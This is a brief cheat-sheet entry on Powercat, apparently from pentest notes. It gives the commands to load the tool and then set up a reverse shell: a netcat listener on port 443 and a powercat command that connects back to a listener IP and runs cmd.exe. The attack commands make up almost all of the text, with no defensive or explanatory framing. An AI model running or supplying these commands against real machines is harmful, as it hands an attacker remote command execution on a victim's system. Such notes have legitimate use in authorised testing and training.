# Powercat 

```powershell
# Load powercat and view help
C:\> ..\powercat.ps1
C:\> powercat -h
```

```powershell
# Powercat reverse shell
$ sudo nc -lvp 443

# Send a reverse shell via Powercat 
C:\> powercat -c <listener IP address> -p 443 -e cmd.exe
```
